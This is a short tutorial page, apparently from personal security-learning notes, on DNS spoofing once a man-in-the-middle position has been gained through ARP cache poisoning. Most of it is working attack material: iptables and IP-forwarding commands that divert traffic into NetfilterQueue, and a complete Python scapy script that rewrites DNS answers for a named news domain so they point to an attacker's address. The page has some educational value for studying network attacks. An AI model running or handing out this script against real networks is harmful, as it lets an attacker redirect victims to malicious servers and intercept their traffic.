---
title: "DNS spoofing"
date: 2019-01-09
# geekdocFlatSection: false
# geekdocToc: 6
# geekdocHidden: false
---

After we become the [mitm][arp_cache_poisoning] we can spoof DNS answers, by modifying the rdata field in the DNS Response request packet.

After spoofing the rdata field will contain a spoofed ip address of a attacker server instead of the original servers IP address.

For this we need to modify packets on the fly. With scapy alone this is not possible, we need to use NetfilterQueue.  
To get this code to work you first need to run arp cache poisoning and run this command on attacker machine:  

[arp_cache_poisoning]: https://jwever.bitbucket.io/lan/exploitation/mitm/arp_cache_poisoning/

```Shell
echo '1' > /proc/sys/net/ipv4/ip_forward
iptables -I FORWARD -j NFQUEUE --queue-num 0
```

Or without arp spoofing on local machine:  
```Shell
iptables -I OUTPUT -j NFQUEUE --queue-num 0
iptables -I INPUT -j NFQUEUE --queue-num 0
```

```python
import netfilterqueue
from scapy.all import IP
import scapy.all as scapy


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "nrc.nl" in qname:
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata="192.168.178.12")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].chksum
            del scapy_packet[scapy.UDP].len

            packet.set_payload(str(scapy_packet))

    packet.accept()



queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
```
